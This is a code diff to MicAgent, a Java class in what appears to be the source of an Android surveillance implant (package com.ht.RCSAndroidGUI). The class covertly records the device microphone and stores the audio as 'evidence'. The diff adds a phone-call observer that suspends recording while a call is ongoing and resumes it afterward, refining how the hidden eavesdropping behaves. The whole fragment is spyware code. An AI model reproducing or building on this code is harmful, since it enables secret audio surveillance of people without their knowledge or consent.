@@ -19,12 +19,15 @@ import android.net.LocalSocket;
 import android.net.LocalSocketAddress;
 import android.util.Log;
 
+import com.ht.RCSAndroidGUI.Call;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.StateRun;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.file.AutoFile;
 import com.ht.RCSAndroidGUI.file.Path;
+import com.ht.RCSAndroidGUI.interfaces.Observer;
+import com.ht.RCSAndroidGUI.listener.ListenerCall;
 import com.ht.RCSAndroidGUI.util.Check;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.DateTime;
@@ -61,7 +64,7 @@ import com.ht.RCSAndroidGUI.util.Utils;
  *       they were in the previous recipe for playback.
  * @author zeno
  */
-public class MicAgent extends AgentBase {
+public class MicAgent extends AgentBase implements Observer<Call> {
 
 	private static final long MIC_PERIOD = 5000;
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
@@ -165,11 +168,7 @@ public class MicAgent extends AgentBase {
 					suspend();
 				}
 
-				if (callInAction()) {
-					Log.d("QZ", TAG + "phone call in progress, suspend!");
-					suspend();
-
-				} else if (Status.self().crisisMic()) {
+				if (Status.self().crisisMic()) {
 					Log.d("QZ", TAG + "crisis, suspend!");
 					suspend();
 				}
@@ -178,6 +177,12 @@ public class MicAgent extends AgentBase {
 	}
 
 	private void addPhoneListener() {
+		ListenerCall.self().attach(this);
+	}
+
+	private void removePhoneListener() {
+		// TODO Auto-generated method stub
+	
 	}
 
 	private void saveRecorderEvidence() {
@@ -354,13 +359,14 @@ public class MicAgent extends AgentBase {
 		return additionalData;
 	}
 
-	private boolean callInAction() {
-		// TODO Auto-generated method stub
-		return false;
-	}
-
-	private void removePhoneListener() {
-		// TODO Auto-generated method stub
-
+	public void notification(Call call) {
+		if(call.isOngoing()){
+			Log.d("QZ", TAG + " (notification): call incoming, suspend");
+			suspend();
+		}else{
+			Log.d("QZ", TAG + " (notification): ");
+			resume();
+		}
+		
 	}
 }
